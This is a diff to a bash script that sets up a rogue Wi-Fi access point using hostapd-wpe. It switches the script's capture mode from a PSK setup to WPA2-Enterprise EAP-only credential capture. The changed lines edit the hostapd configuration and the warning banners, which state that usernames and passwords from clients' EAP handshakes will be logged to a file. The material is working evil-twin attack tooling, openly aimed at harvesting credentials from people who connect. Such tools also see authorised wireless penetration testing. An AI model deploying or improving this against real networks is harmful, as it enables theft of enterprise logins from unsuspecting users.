@@ -395,7 +395,7 @@ ip addr add "$AP_IP/24" dev "$WLAN_IF" 2>/dev/null || true
 
 # Create hostapd config
 if [[ "$CAPTURE_AUTH" == "true" ]]; then
-  log_info "Creating hostapd-wpe configuration for WPA2 password capture..."
+  log_info "Creating hostapd-wpe configuration for WPA2-Enterprise (EAP) credential capture..."
   HOSTAPD_CONFIG="$HOSTAPD_WPE_CONF"
   cat > "$HOSTAPD_CONFIG" <<EOF
 interface=$WLAN_IF
@@ -406,12 +406,11 @@ hw_mode=g
 ieee80211n=1
 wmm_enabled=1
 
-# WPA2 configuration for password capture
+# WPA2-Enterprise (EAP only - no PSK)
 wpa=2
-wpa_key_mgmt=WPA-PSK WPA-EAP
+wpa_key_mgmt=WPA-EAP
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
-wpa_passphrase=12345678
 
 # EAP configuration for capturing credentials
 ieee8021x=1
@@ -428,9 +427,6 @@ logger_syslog=-1
 logger_syslog_level=0
 logger_stdout=-1
 logger_stdout_level=0
-
-# Challenge username
-challenge_response_username=hostapd-wpe
 EOF
 else
   log_info "Creating hostapd configuration for open network..."
@@ -535,13 +531,14 @@ log_info "Interface: $WLAN_IF"
 log_info "Gateway IP: $AP_IP"
 log_info "DHCP Range: ${DHCP_RANGE_START} - ${DHCP_RANGE_END}"
 [[ "$UPLINK_IF" != "none" ]] && log_info "Internet: Shared via $UPLINK_IF" || log_info "Internet: Not shared (no uplink)"
-[[ "$CAPTURE_AUTH" == "true" ]] && log_warn "Security: WPA2 PASSWORD CAPTURE MODE ACTIVE" || log_info "Security: Open (no password)"
+[[ "$CAPTURE_AUTH" == "true" ]] && log_warn "Security: WPA2-ENTERPRISE (EAP) CREDENTIAL CAPTURE MODE ACTIVE" || log_info "Security: Open (no password)"
 echo
 echo -e "${YELLOW}Waiting for clients to connect...${NC}"
 if [[ "$CAPTURE_AUTH" == "true" ]]; then
   echo -e "${RED}╔════════════════════════════════════════════════════╗${NC}"
-  echo -e "${RED}║  ⚠️  PASSWORD CAPTURE MODE ACTIVE  ⚠️            ║${NC}"
-  echo -e "${RED}║  Any password entered by clients will be logged  ║${NC}"
+  echo -e "${RED}║  ⚠️  EAP CREDENTIAL CAPTURE MODE ACTIVE  ⚠️       ║${NC}"
+  echo -e "${RED}║  Enterprise credentials (usernames/passwords)    ║${NC}"
+  echo -e "${RED}║  from EAP handshakes will be logged              ║${NC}"
   echo -e "${RED}╚════════════════════════════════════════════════════╝${NC}"
   echo -e "${YELLOW}Captured credentials will be saved to: $AUTH_LOG${NC}"
 fi
